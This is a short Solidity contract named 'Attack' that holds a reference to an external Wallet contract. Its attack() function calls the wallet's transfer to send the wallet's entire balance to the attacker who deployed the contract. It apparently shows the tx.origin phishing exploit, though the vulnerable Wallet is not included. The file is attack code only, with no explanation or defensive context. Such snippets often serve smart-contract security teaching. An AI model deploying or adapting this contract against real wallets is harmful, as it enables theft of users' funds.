pragma solidity ^0.6.10;
contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor (Wallet _wallet) public {
        wallet = Wallet(_wallet);
        owner = msg.sender;
    }
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
	}
}